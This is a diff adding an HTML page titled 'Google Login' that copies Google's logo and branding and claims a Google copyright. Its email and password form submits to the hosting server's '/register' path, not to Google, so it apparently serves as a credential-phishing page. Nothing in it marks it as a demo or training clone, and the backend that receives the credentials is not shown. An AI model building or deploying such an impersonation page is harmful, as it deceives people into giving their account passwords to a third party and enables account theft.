@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Login</title>
+  <style>
+    /* === GENERAL STYLES === */
+    body {
+      margin: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      background: #f0f2f5;
+      color: #202124;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 90%;
+      max-width: 1000px;
+      flex-wrap: wrap;
+      gap: 30px;
+    }
+
+    /* === LEFT SIDE === */
+    .left-side {
+      flex: 1;
+      min-width: 300px;
+      text-align: left;
+    }
+
+    .left-side img {
+      width: 250px;
+      max-width: 100%;
+      margin-bottom: 10px;
+    }
+
+    .left-side h2 {
+      font-size: 22px;
+      font-weight: normal;
+      color: #5f6368;
+      line-height: 1.4;
+    }
+
+    /* === RIGHT SIDE (LOGIN BOX) === */
+    .login-box {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      width: 360px;
+      max-width: 100%;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #dadce0;
+      border-radius: 6px;
+      background-color: #fff;
+      color: #202124;
+      font-size: 16px;
+      box-sizing: border-box;
+      outline: none;
+    }
+
+    .login-box input:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.1);
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1a73e8;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background 0.3s ease;
+    }
+
+    .login-box button:hover {
+      background-color: #155ab6;
+    }
+
+    .divider {
+      text-align: center;
+      color: #5f6368;
+      margin: 15px 0;
+      font-size: 14px;
+    }
+
+    .create-btn {
+      display: block;
+      width: 93%;
+      text-align: center;
+      background-color: #4285F4;
+      color: white;
+      border-radius: 6px;
+      padding: 12px;
+      font-weight: bold;
+      text-decoration: none;
+      transition: background 0.3s ease;
+    }
+
+    .create-btn:hover {
+      background-color: #357ae8;
+    }
+
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 13px;
+      color: #5f6368;
+    }
+
+    /* === RESPONSIVE DESIGN === */
+    @media (max-width: 900px) {
+      .container {
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+      }
+
+      .left-side {
+        text-align: center;
+      }
+
+      .left-side h2 {
+        font-size: 18px;
+      }
+
+      .login-box {
+        width: 100%;
+        max-width: 400px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      body {
+        padding: 10px;
+      }
+
+      .left-side img {
+        width: 180px;
+      }
+
+      .left-side h2 {
+        font-size: 16px;
+      }
+
+      .login-box {
+        padding: 20px;
+      }
+
+      .login-box input,
+      .login-box button,
+      .create-btn {
+        font-size: 14px;
+        padding: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Left Side -->
+    <div class="left-side">
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+      <h2>Sign in and stay connected with Google services.</h2>
+    </div>
+
+    <!-- Right Side -->
+    <div class="login-box">
+      <form action="/register" method="post" >
+        <input type="text" name="username" placeholder="Email or phone" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log in</button>
+
+        <div class="divider">or</div>
+        <a href="/register" class="create-btn">Create new Google account</a>
+      </form>
+
+      <div class="footer">
+        <p>© 2025 Google — Light Mode Login</p>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
